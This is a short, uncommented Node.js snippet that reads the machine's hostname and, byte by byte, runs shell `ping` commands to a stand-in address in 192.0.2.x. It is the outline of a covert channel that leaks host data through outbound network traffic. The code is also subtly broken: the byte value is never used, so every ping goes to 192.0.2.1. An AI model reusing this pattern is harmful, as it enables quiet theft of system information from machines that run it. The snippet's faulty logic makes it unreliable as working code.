const os = require('os');
const {exec} = require('child_process');
for (const value of Buffer.from(os.hostname())) {
  sendByte('192.0.2.', value);
}
function sendByte(prefix, octet) {
  exec(`ping -n 1 -w 300 ${prefix}1`);
}
